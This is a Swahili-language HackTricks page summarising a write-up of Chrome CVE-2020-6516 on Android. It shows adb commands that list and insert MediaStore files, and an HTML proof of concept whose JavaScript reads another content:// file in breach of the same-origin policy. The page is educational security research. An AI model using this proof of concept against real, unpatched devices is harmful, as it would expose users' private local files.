<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Hii ni muhtasari wa chapisho [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### Orodha ya Faili katika Hifadhi ya Media
Ili kuorodhesha faili zinazosimamiwa na Hifadhi ya Media, unaweza kutumia amri ifuatayo:
```bash
$ content query --uri content://media/external/file
```
Kwa matokeo yanayoeleweka zaidi na ya kirafiki kwa binadamu, onyesha tu kitambulisho na njia ya kila faili iliyohifadhiwa:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
### Upatikanaji wa Chrome kwa Watoa Huduma za Yaliyomo
Chrome kwenye Android inaweza kupata watoa huduma za yaliyomo kupitia mpango wa `content://`, kuruhusu kupata rasilimali kama picha au hati zilizotolewa na programu za watu wa tatu. Ili kufafanua hili, faili inaweza kuingizwa kwenye Hifadhi ya Vyombo vya Habari na kisha kupatikana kupitia Chrome:

Ingiza kuingizwa maalum kwenye Hifadhi ya Vyombo vya Habari:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
Gundua kitambulisho cha faili iliyowekwa hivi karibuni:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
Faili hiyo inaweza kisha kuonekana kwenye Chrome kwa kutumia URL iliyojengwa na kitambulisho cha faili.

Kwa mfano, kuorodhesha faili zinazohusiana na programu maalum:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Kizuizi la Sera ya Asili Sawa

_Sera ya Asili Sawa_ (SOP) ni itifaki ya usalama katika vivinjari ambayo inazuia kurasa za wavuti kuingiliana na rasilimali kutoka asili tofauti isipokuwa imeidhinishwa wazi na sera ya Kuvuka-Mwanzo-Mzazi (CORS). Sera hii inalenga kuzuia uvujaji wa habari na udanganyifu wa ombi la wavuti. Chrome inachukulia `content://` kama mpango wa ndani, ikimaanisha sheria kali za SOP, ambapo kila URL ya mpango wa ndani inachukuliwa kama asili tofauti.

Hata hivyo, CVE-2020-6516 ilikuwa udhaifu katika Chrome ulioruhusu kukiuka sheria za SOP kwa rasilimali zilizopakiwa kupitia URL ya `content://`. Kwa athari, msimbo wa JavaScript kutoka URL ya `content://` ulikuwa na uwezo wa kupata rasilimali zingine zilizopakiwa kupitia URL za `content://`, ambayo ilikuwa wasiwasi mkubwa wa usalama, hasa kwenye vifaa vya Android vinavyotumia toleo kabla ya Android 10, ambapo uhifadhi uliolengwa haukuwa umetekelezwa.

Uthibitisho wa dhana hapo chini unaonyesha udhaifu huu, ambapo hati ya HTML, baada ya kupakiwa chini ya **/sdcard** na kuongezwa kwenye Hifadhi ya Vyombo vya Habari, inatumia `XMLHttpRequest` katika JavaScript yake kupata na kuonyesha maudhui ya faili nyingine kwenye Hifadhi ya Vyombo vya Habari, kukiuka sheria za SOP.

Uthibitisho wa Dhana wa HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
